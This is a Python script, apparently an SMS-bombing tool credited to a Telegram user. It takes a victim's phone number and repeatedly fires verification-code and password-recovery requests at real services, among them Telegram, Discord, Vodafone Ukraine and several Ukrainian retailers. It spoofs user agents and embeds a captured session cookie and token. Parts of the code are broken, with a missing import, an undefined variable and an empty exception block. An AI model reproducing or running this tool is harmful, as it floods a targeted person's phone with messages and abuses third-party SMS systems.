#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
import requests,fake_useragent,time,os,threading
from threading import Thread
from rich.console import Console
from rich.progress import *
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
console = Console()

os.system('cls' if os.name == 'nt' else 'clear')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def generate_info():
    global _name
    global _email
    global password
    global username
    global junker_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
console.print('''[bold red]
 Создатель - Hironotori
 Telegram - @Hironotori
 Человек которий сильно помог - @GGClubbb
''')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
number = input('Beeante HOMeP tenedona: (бes + ')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
run = int(console.input('[green]Введите количество повторов (1-10):\n[blue]spammer>> '))
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
for _ in track(range(run)):
    headers = {"User-Agent": fake_useragent.UserAgent().random}
    try:#ok
            print('experiments')
            requests.post('https://epicentrk.ua/api/person/v1/user/recoverypassword/sendrecoverycode/', data={'LANG_ID': 'ua','USER_LOGIN': '+' + phone}, headers={'X-Requested-With':'XMLHttpRequest', 'p3p': 'policyref="/bitrix/p3p.xml", CP="NON DSP COR CUR ADM DEV PSA PSD OUR UNR BUS UNI COM NAV INT DEM STA"', 'strict-transport-security': 'max-age=15552000; includeSubDomains; preload', 'x-content-type-options': 'nosniff', 'x-frame-options': 'SAMEORIGIN', 'x-powered-by': 'PHP/7.4.25', 'x-powered-cms': 'Bitrix Site Manager (4bc356218be26e889085d220a9e786a6)', 'cookie': 'PHPSESSID=1t269iinndd7md5sqo8b7700ek; LANG=ua; LANG_SUBDOMAIN=ua; store-id=2; BITRIX_SM_LOCATION=def50200d1678734f41f460bcd67c0e7f652714c1d25112350930f045277c17c3fb7e18849564c70e87aff0cb6bdb7fb67ecb0f52d6c1f94ba2cd85eb71a663570f93e7c082af1b70d2dc0699c0fb92fbc1e91bb41207d55050bb0224e2049f81fb29a2b4d5d6a7539faad7f65c9ae4ecd446f2896174b6748a8b10ede7882533e4999299a0f81d0b443d6373f63abf0d4d77a0386c8a62ae62d4c5757efee8f1b9509531f037e80f3f36d177b52881abc9f9015eecb07a4cb6e96dc6dd1982b36c818a2c2204b33c9569da3b7dbc5cad5f5f533e9675802fe8eed5281c1395a5119240aa78011dbe5fb77c1d90995b614055cfeb2c5c0bd353151860c9c80f69d92e4459d62564c278acd490258744932689aaba880b2342988af8fce68527affbded359f5b8708c302a333dde73759c0fdf40a5ccc91180d1f372489007258c4daa195f06c65dcdde2dc4a2bfd9b840e1e70a8618cffeaff22df24bf4ddb740a4f1c303fa7c2c763c939fee7348d03aacd73f7fcfe6078a8497a90d143aa1d3fff2eb11a3e1e9e6fe984b7ae7737130645e4e8b9a37a482b36756a8c8f9210007219ddae33a4fe03dfc228771214786ad545a8f9609e470997effe16605c67292944fce82b5ead32856b755e854f0b23175b6e6a07f0a6a4909de9a0c9a27c4f622ebabeee2fbfc79e6767b8cfa5454ee04288b428606b2b7f8f06488379e59b7b82c84cc7637b8dee7dc4bdc66953e5c17943b028a0309ac2b808c27af7f7e48829e001815b729e95cc5e2e679e6b0597f506b32299651230a809f9831c19d0f8f60bf591323b85f09252505f23ded9779ec7a79b03835ae8cf22ce74933b69310979b3c2b51c630b9c2947e8b3bb6e37e8e86a7f11c97246a0e69f98d9f2b4119fd4f414817d14e88becaf74dec96c8fd19793f148465e34d5686192f8bec785f9769c68257a7d66e53c57959e910b52c72d62175c4ae80bb9807b88402ec75baea52fcb6798aaf0207652aefd32f398b61fe122141945a6728ad39266236784689291f53321c340e49cbfbbc848102bcd88adc3a1d6ccb5cf7e194077788dd8e29df092422a975a811e342476ef5ac9a6c666300f522bcf6efab10665930ca8cabcae0bf36bd79180f88e1faad119b77424df67ef529e4ff99c7d0f; BITRIX_SM_SALE_UID=923039850; __cf_bm=m.Ou9mYjkunw4v3prk5KThV3IsEiJ8jVbYutsIO8HQc-1635883869-0-AZdGHS57eMlrlhw5HODImuySQ6oD7owXlUEaV/ADBv28dDvqGGuJxLP5qXXIcIRcJqINHsgInJbBO9hIeRsCTUk=; _gcl_au=1.1.329786748.1635883887; epic_digital_sid=7889b9f5142983dee7f317fd460b3dc3; sc=8DC29604-D83A-CA43-1D7A-AEA55625A39A; BX_USER_ID=e9be5297d091d2b0a0648651770a6910; _gid=GA1.2.1712308472.1635883935; _hjid=367b87a5-a8e4-49df-9b28-e8bba9438837; _hjFirstSeen=1; _gaexp=GAX1.2.WlLos1ScS0WHGIPl3C-mtA.19018.x578; _dc_gtm_UA-69938460-2=1; _dc_gtm_UA-56814631-1=1; _dc_gtm_UA-69938460-1=1; _gat_UA-69938460-2=1; _hjIncludedInSessionSample=0; _hjAbsoluteSessionInProgress=0; _ga_VC9M164SVX=GS1.1.1635883886.1.1.1635883963.43; _ga=GA1.2.437891472.1635883935', 'referer': 'https://epicentrk.ua/ua/personal/restore/?forgot_password=yes&backurl=%2Fua%2Fpersonal%2Flogin%2F', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-store, no-cache, must-revalidate', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
            print('NO experiments')
    except:
    try:#ok
            requests.post("https://my.xtra.tv/api/signup?lang=uk", data={"phone": number}, headers=headers)
            print('my.xtra.tv')
    except:
            print('Не отправлено (my.xtra.tv)')
    try:#ok
            requests.post("https://bi.ua/api/v1/accounts", json={"grand_type": "sms_code", "login": "Сергей", "phone": number, "stage": "1"}, headers=headers)
            print('bi.ua')
    except:
            print('Не отправлено (bi.ua)')
    try:#ok
            requests.post("https://my.ctrs.com.ua/api/auth/login", data={"provider": "phone", "identity": number}, headers=headers)
            print('ctrs')
    except:
            print('Не отправлено (ctrs)')
    try:#ok
            requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers)
            print('telegram')
    except:
            print('Не отправлено (telegram)')
    try:
            requests.post("https://u.icq.net/api/v70/rapi/auth/sendCoden", params={"phone": number, "devId": "ic1rtwz1s1Hj1O0r"}, headers=headers)
            print('icq')
    except:
           print('Не отправлено (icq)')
    try:#ok/no
            requests.post("https://discord.com/api/v9/auth/register/phone", json={"phone": "+" + number}, headers=headers)
            print('discord')
    except:
            print('Не отправлено (discord)')
    try:#ok
            requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
            print('vodafone')
    except:
            print('Не отправлено (vodafone)')
    try:#ok
            requests.post("https://megasport.ua/api/auth/phone/?language=ru", json={"phone": "+" + number}, headers=headers)
            print('megasport')
    except:
            print('Не отправлено (megasport)')
    try:#ok
            requests.post("https://zolotakoroleva.ua/api/send-otp", json={"params": {"phone": "+" + number}}, headers=headers)
            print('zolotakoroleva.ua')
    except:
            print('Не отправлено (zolotakoroleva.ua)')
    try:#ok
            requests.post("https://mozayka.com.ua/!processing/ajax.php", data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"}, headers=headers)
            print('mozayka.com.ua')
    except:
            print('Не отправлено (mozayka.com.ua)')
    try:#ok
            requests.post("https://kazan-divan.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers)
            print('kazan-divan.eatery.club')
    except:
            print('Не доставлено (kazan-divan.eatery.club)')
    try:#ok
            requests.post("https://admin1.groshivsim.com/api/sms/phone-verification/create", json={"phone": number}, headers=headers)
            print('groshivsim.com')
    except:
            print('Не отправлено (groshivsim.com)')
    try:#ok
            requests.post("https://money4you.ua/api/clientRegistration/sendValidationSms", json={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + number, "udriveEmployee": "false"}, headers=headers)
            print('money4you.ua')
    except:
            print('Не отправлено (money4you.ua)')
